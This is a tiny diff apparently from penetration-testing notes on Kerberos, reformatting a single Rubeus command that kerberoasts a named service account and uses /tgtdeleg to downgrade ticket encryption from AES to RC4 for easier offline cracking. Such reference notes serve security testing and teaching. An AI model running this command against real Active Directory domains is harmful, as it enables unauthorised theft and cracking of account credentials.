@@ -17,4 +17,4 @@ Extracting tickets for specific user account
 
 Using tgtdeleg to downgrade aes to rc4
 
-.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+```.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap```
